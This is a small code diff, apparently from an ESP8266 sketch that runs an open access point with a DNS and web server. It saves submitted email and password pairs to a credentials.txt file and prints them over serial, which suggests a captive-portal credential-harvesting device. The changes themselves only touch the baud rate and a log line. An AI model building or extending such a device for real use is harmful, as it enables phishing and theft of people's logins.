@@ -10,7 +10,7 @@ DNSServer dnsServer;
 ESP8266WebServer webServer(80);
 
 void setup() {
-  Serial.begin(115200);
+  Serial.begin(74880);
   SPIFFS.begin();
 
   WiFi.softAP(ssid);
@@ -75,9 +75,9 @@ void saveCredentials(String email, String password) {
 }
 
 void printSavedCredentials() {
+  Serial.println("Printing saved credentials if any.");
   File f = SPIFFS.open("/credentials.txt", "r");
   if (f) {
-    Serial.println("Saved Credentials:");
     while (f.available()) {
       String line = f.readStringUntil('\n');
       Serial.println(line);
